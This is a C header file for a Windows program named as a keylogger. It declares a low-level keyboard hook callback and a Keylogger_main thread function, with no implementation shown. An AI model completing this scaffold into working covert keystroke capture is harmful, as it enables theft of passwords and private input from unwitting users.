#pragma once
#ifndef Keylogger_header_h    // To make sure you don't declare the function more than once by including the header multiple times.
#define Keylogger_header_h
#include <Windows.h>
#define MY_MAX_PATH MAX_PATH*3


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI Keylogger_main(LPVOID lpParameter);

#endif
